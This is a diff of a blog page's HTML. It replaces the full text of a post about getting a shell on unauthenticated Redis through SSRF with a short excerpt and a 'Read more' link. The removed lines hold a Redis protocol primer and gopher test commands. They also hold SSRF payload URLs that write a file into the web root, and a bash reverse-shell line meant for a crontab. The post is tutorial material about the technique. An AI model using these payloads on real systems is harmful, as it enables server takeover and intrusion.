@@ -353,51 +353,14 @@
 
       
         
-          
-            <p>Here are some basics for better reading before we get deeper the detail of this vulnerabilities.</p>
-<h3 id="RESP-Redis-Serialization-Protocol-Feature"><a href="#RESP-Redis-Serialization-Protocol-Feature" class="headerlink" title="RESP (Redis Serialization Protocol)  Feature"></a><em>RESP (Redis Serialization Protocol)  Feature</em></h3><ol>
-<li><em>Networking layer</em> (Client connect to a Redis server creating a <em>TCP</em> connection to the port 6379)</li>
-<li><em>Request-Respone model</em>(Redis accepts commands composed of different arguments. Once a command is received, it is processed and a reply is sent back to the client)<ul>
-<li>Redis supports pipelining (covered later in this document). So it is possible for clients to send multiple commands at once, and wait for replies later</li>
-<li>When a Redis client subscribes to a Pub/Sub channel, the protocol changes semantics and becomes a <em>push</em>protocol, that is, the client no longer requires to send commands, because the server will automatically send to the client new messages (for the channels the client is subscribed to) as soon as they are received.</li>
-</ul>
-</li>
-<li>Support five data types<ul>
-<li><strong>Simple Strings</strong> the first byte of the reply is “+”</li>
-<li><strong>Errors</strong> the first byte of the reply is “-“</li>
-<li><strong>Integers</strong> the first byte of the reply is “:”</li>
-<li><strong>Bulk Strings</strong> the first byte of the reply is “$”</li>
-<li><strong>Arrays</strong> the first byte of the reply is “<code>*</code>“</li>
-</ul>
-</li>
-</ol>
-<h3 id="Redis-Protected-mode"><a href="#Redis-Protected-mode" class="headerlink" title="Redis Protected mode"></a><em>Redis Protected mode</em></h3><p>Since <strong><em>version 3.2.0</em></strong>, when Redis is executed with the default configuration (binding all the interfaces) and without any password in order to access it, it enters a special mode called <strong><em>protected mode</em></strong>. In this mode Redis <strong><em>only replies to queries from the loopback interfaces, and reply to other clients connecting from other addresses with an error</em></strong>, explaining what is happening and how to configure Redis properly.</p>
-<h3 id="Hack-the-Redis"><a href="#Hack-the-Redis" class="headerlink" title="Hack the Redis"></a><em>Hack the Redis</em></h3><h4 id="Prerequisites"><a href="#Prerequisites" class="headerlink" title="Prerequisites"></a><em>Prerequisites</em></h4><ol>
-<li>Run redis-server with the default config as the <em>root</em> user.</li>
-<li>Know the path of the server</li>
-</ol>
-<h4 id="Self-test"><a href="#Self-test" class="headerlink" title="Self-test"></a><em>Self-test</em></h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">redis-server --port 6378</div></pre></td></tr></table></figure>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">socat -v tcp-listen:6379,fork tcp-connect:localhost:6378</div></pre></td></tr></table></figure>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">curl -v "gopher://127.0.0.1:6379/_info"</div><div class="line">curl -v "gopher://127.0.0.1:6379/!info"</div></pre></td></tr></table></figure>
-<p>We need to add something before the <em>path info</em>, because the gopher protocol will <em>ignore the first char of the path</em>. Then you will see the following output.</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Server redis_version:3.2.10 </div><div class="line">...</div><div class="line">...</div><div class="line">...</div><div class="line">+OK</div></pre></td></tr></table></figure>
-<p><strong><em>Last but not the least, the key to hack redis is to write file in redis server.</em></strong></p>
-<h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a><em>Example</em></h4><p>Assuming that you found the <em>SSRF</em> vuln in the website and it runs the redis on the <em>port 6379</em>, then you can try the following to get shell.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://x/path?url=gopher://127.0.0.1/6379/_config%20set%20dir%20%2fwebpath</div><div class="line">http://x/path?url=gopher://127.0.0.1/6379/_set%201%20%2fshellscript</div><div class="line">http://x/path?url=gopher://127.0.0.1/6379/_config%20set%20dbfilename%20%2ffilename</div><div class="line">http://x/path?url=gopher://127.0.0.1/6379/_save%20</div></pre></td></tr></table></figure>
-<p>Then you can access the file wrote in the web root directory.</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">http://x/filename</span></div></pre></td></tr></table></figure>
-<p>Of course, you can write crontab task to get shell.</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1</div></pre></td></tr></table></figure>
-<p>Happy Hacking</p>
-<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a><em>Reference</em></h3><ul>
-<li><a href="https://joychou.org/web/phpssrf.html" target="_blank" rel="external">SSRF in PHP</a></li>
-<li><a href="https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html#0x02" target="_blank" rel="external">getshell-via-ssrf-and-redis</a></li>
-<li><a href="http://www.angelwhu.com/blog/?p=427" target="_blank" rel="external">attack cgi with ssrf</a></li>
-<li><a href="https://redis.io/topics/security" target="_blank" rel="external">Redis Security</a></li>
-<li><a href="https://blog.chaitin.cn/gopher-attack-surfaces/" target="_blank" rel="external">gopher-attack-surfaces</a></li>
-</ul>
-
-          
+          <p>Here are some basics for better reading before we get deeper the detail of this vulnerability.</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017-12-01-How-to-write-shell-with-redis-unauthorized/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
